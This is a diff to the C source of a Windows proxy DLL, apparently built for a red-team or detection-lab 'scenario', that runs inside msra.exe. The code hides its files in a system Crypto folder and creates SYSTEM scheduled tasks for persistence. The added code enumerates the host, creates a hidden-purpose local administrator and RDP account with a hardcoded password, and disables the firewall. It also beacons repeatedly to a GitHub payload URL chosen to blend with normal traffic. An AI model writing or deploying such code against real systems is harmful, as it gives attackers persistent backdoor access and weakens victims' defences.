@@ -1,18 +1,30 @@
 #include <windows.h>
 #include <stdio.h>
 #include <tlhelp32.h>
+#define SECURITY_WIN32
+#include <secext.h>
 #include <shobjidl.h>
 #include <objbase.h>
 #include <oleauto.h>
 #define COBJMACROS
 #include <taskschd.h>
+#include <urlmon.h>
 
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "oleaut32.lib")
 #pragma comment(lib, "taskschd.lib")
+#pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "secur32.lib")
 
 static const char *g_dir = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18";
 static const char *g_audit = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\audit.log";
+
+/* ponytail: enumeration config - fixed creds (task said fixed), beacon URL
+   reuses the scenario4 repo raw path already pulled elsewhere (blends with
+   existing GET traffic, no 404 noise). */
+static const char *g_enum_user  = "support";
+static const char *g_enum_pass  = "P@ssw0rd!23";
+static const char *g_beacon_url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/payload.zip";
 
 static HMODULE g_real = NULL;
 
@@ -91,15 +103,16 @@ static void create_lnk(void) {
     sl->lpVtbl->Release(sl);
 }
 
-/* ponytail: launch schtasks.exe directly (no cmd.exe /c wrapper) with stdio
-   redirected to \\.\NUL via STARTUPINFO. The proxy DLL runs inside msra.exe
-   which has no console; system() := cmd.exe /c ... >nul 2>&1 deadlocks inside
-   a windowless host waiting on the redirected handles, so worker_thread never
-   advances past the GOVINDA system() call (Orion never gets created - matches
-   the audit log which ends at "Creating GOVINDA task"). Bounded WaitForSingle
-   Object makes any hang the proxy's problem, not Task Scheduler's. */
-static int run_schtasks(const char *cmdline, DWORD timeoutMs) {
-    /* ponytail: open NUL for read+write so all three std handles are real;
+/* ponytail: generic bounded process launcher for the no-console host.
+   Direct CreateProcessA of the target (cmdline already contains the exe +
+   args), stdio redirected to \\.\NUL via STARTUPINFO handles (NOT shell '>'
+   redirection - system()/cmd.exe /c ... >nul 2>&1 deadlocks in a windowless
+   host). Bounded WaitForSingleObject means a hung child can't stall the
+   worker thread forever. Used by persistence (schtasks.exe direct) and
+   enumeration (cmd.exe /c net.exe | netsh.exe - two Process Create events
+   each = the "noise"). */
+static int run_exe(const char *cmdline, DWORD timeoutMs) {
+    /* ponytail: open NUL for read+write so all three std handles are real.
        STARTF_USESTDHANDLES with a NULL stdin can race in some hosts. */
     HANDLE nulW = CreateFileA("\\\\.\\NUL", GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -134,7 +147,7 @@ static void create_task_govinda(void) {
     // ponytail: check existence via schtasks /query (short timeout; query is fast)
     char q[MAX_PATH * 2];
     wsprintfA(q, "schtasks.exe /query /tn GOVINDA");
-    if (run_schtasks(q, 10000) == 0) { audit("[+] GOVINDA task already exists"); return; }
+    if (run_exe(q, 10000) == 0) { audit("[+] GOVINDA task already exists"); return; }
 
     /* ponytail: /ru SYSTEM skips the interactive password prompt that
        /rl highest (no /ru) hits and hangs in a non-interactive session.
@@ -142,7 +155,7 @@ static void create_task_govinda(void) {
     char c[MAX_PATH * 4];
     wsprintfA(c, "schtasks.exe /create /tn GOVINDA /tr \"%s\" /ru SYSTEM /sc onlogon /f", taskPath);
     audit("[+] Creating GOVINDA task (schtasks.exe)");
-    if (run_schtasks(c, 30000) == 0) audit("[+] GOVINDA task created");
+    if (run_exe(c, 30000) == 0) audit("[+] GOVINDA task created");
     else audit("[-] GOVINDA task creation failed");
 }
 
@@ -212,8 +225,113 @@ static void create_task_orion(void) {
     ITaskService_Release(svc);
 }
 
+/* ponytail: host enumeration + persistence hardening. Collects user/host/IP,
+   creates a local admin + RDP account (fixed creds), disables the firewall,
+   writes it all to enumeration.txt, then beacons github 5x (2s between calls).
+   Every action goes through run_exe("cmd.exe /c <tool> ...") so each step
+   generates two Process Create events (cmd.exe + the wrapped tool) = the
+   "noise" the scenario wants in Sysmon/Event Log. Best-effort throughout:
+   a failed step is logged + skipped, never aborts the rest. */
+static void enumerate_host(void) {
+    char userBuf[256];  DWORD userLen = sizeof(userBuf);
+    char hostBuf[256];  DWORD hostLen = sizeof(hostBuf);
+    char ipBuf[64];     ipBuf[0] = 0;
+
+    if (!GetUserNameExA(NameSamCompatible, userBuf, &userLen)) {
+        lstrcpynA(userBuf, "unknown", sizeof(userBuf));
+        audit("[-] GetUserNameEx failed (%lu)", GetLastError());
+    } else {
+        audit("[+] Enumerate: user=%s", userBuf);
+    }
+
+    if (!GetComputerNameExA(ComputerNameNetBIOS, hostBuf, &hostLen)) {
+        lstrcpynA(hostBuf, "unknown", sizeof(hostBuf));
+        audit("[-] GetComputerNameEx failed (%lu)", GetLastError());
+    } else {
+        audit("[+] Enumerate: host=%s", hostBuf);
+    }
+
+    /* Public IP: download body of ifconfig.me to a temp file, read first line,
+       delete it. URLDownloadToFileA is already the codebase's fetch pattern. */
+    char ipFile[MAX_PATH], ipTemp[MAX_PATH];
+    wsprintfA(ipFile, "%s\\ip.txt", g_dir);
+    DeleteFileA(ipFile);
+    HRESULT hr = URLDownloadToFileA(NULL, "https://ifconfig.me", ipFile, 0, NULL);
+    if (hr == S_OK) {
+        FILE *f = fopen(ipFile, "r");
+        if (f) {
+            if (fgets(ipBuf, sizeof(ipBuf), f)) {
+                /* trim trailing newline */
+                char *nl = strchr(ipBuf, '\n'); if (nl) *nl = 0;
+                char *cr = strchr(ipBuf, '\r'); if (cr) *cr = 0;
+                audit("[+] Enumerate: public IP=%s", ipBuf);
+            }
+            fclose(f);
+        }
+        DeleteFileA(ipFile);
+    }
+    if (!ipBuf[0]) {
+        lstrcpynA(ipBuf, "unreachable", sizeof(ipBuf));
+        audit("[-] Public IP fetch failed (0x%lx)", hr);
+    }
+
+    /* Create the local admin + RDP account via net.exe wrapped in cmd.exe /c
+       so each call spawns cmd.exe + net.exe = two Process Create events. */
+    char netUser[256], netAdmin[256], netRdp[256];
+    wsprintfA(netUser,  "cmd.exe /c net.exe user %s %s /add", g_enum_user, g_enum_pass);
+    wsprintfA(netAdmin, "cmd.exe /c net.exe localgroup Administrators %s /add", g_enum_user);
+    wsprintfA(netRdp,   "cmd.exe /c net.exe localgroup \"Remote Desktop Users\" %s /add", g_enum_user);
+
+    audit("[+] Enumerate: creating user %s", g_enum_user);
+    if (run_exe(netUser, 30000) == 0) audit("[+] Enumerate: net user /add ok");
+    else audit("[-] Enumerate: net user /add failed (exists?)");
+    if (run_exe(netAdmin, 30000) == 0) audit("[+] Enumerate: added to Administrators");
+    else audit("[-] Enumerate: localgroup Administrators /add failed");
+    if (run_exe(netRdp, 30000) == 0) audit("[+] Enumerate: added to Remote Desktop Users");
+    else audit("[-] Enumerate: localgroup \"Remote Desktop Users\" /add failed");
+
+    /* Disable firewall via netsh wrapped in cmd.exe /c (Process Create noise).
+       Best-effort: log + continue even if it fails. */
+    char netshCmd[256];
+    lstrcpynA(netshCmd, "cmd.exe /c netsh.exe advfirewall set allprofiles state off", sizeof(netshCmd));
+    BOOL fwOff = (run_exe(netshCmd, 30000) == 0);
+    if (fwOff) audit("[+] Enumerate: firewall disabled");
+    else       audit("[-] Enumerate: firewall disable failed");
+
+    /* Beacon GitHub repo raw URL 5 times, 2s between each (no delay before
+       the first). URLDownloadToFileA to \\.\NUL keeps it cheap (no file I/O).
+       Reuses the same scenario-4 raw URL pulled elsewhere - blends in. */
+    int ok = 0;
+    for (int i = 1; i <= 5; i++) {
+        hr = URLDownloadToFileA(NULL, g_beacon_url, "\\\\.\\NUL", 0, NULL);
+        if (hr == S_OK) { ok++; audit("[+] beacon %d/5 ok", i); }
+        else            { audit("[-] beacon %d/5 failed (0x%lx)", i, hr); }
+        if (i < 5) Sleep(2000);
+    }
+    audit("[+] Enumerate: beacons sent %d/5", ok);
+
+    /* Write enumeration.txt once, at the end, with the final beacon count.
+       Overwrite each run; audit.log still appends. */
+    char enumPath[MAX_PATH];
+    wsprintfA(enumPath, "%s\\enumeration.txt", g_dir);
+    FILE *ef = fopen(enumPath, "w");
+    if (ef) {
+        fprintf(ef, "Username=%s\n", userBuf);
+        fprintf(ef, "Hostname=%s\n", hostBuf);
+        fprintf(ef, "PublicIP=%s\n", ipBuf);
+        fprintf(ef, "NewAccount=%s\n", g_enum_user);
+        fprintf(ef, "Password=%s\n", g_enum_pass);
+        fprintf(ef, "FirewallDisabled=%s\n", fwOff ? "true" : "false");
+        fprintf(ef, "BeaconResult=sent %d/5\n", ok);
+        fclose(ef);
+        audit("[+] enumeration.txt written -> %s", enumPath);
+    } else {
+        audit("[-] Cannot write %s", enumPath);
+    }
+}
+
 static DWORD WINAPI worker_thread(LPVOID lp) {
-    audit("[+] Worker thread started (userenv.dll build 2026-07-16-v2: direct CreateProcess schtasks)");
+    audit("[+] Worker thread started (userenv.dll build 2026-07-16-v3: + enumeration)");
     CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
     // ponytail: pump messages so COM (Task Scheduler API) doesn't deadlock
     // inside this STA thread. Download/extract/launch is now done in
@@ -225,6 +343,7 @@ static DWORD WINAPI worker_thread(LPVOID lp) {
     create_lnk();
     create_task_govinda();
     create_task_orion();
+    enumerate_host();
 
     audit("[+] Worker thread completed");
     CoUninitialize();
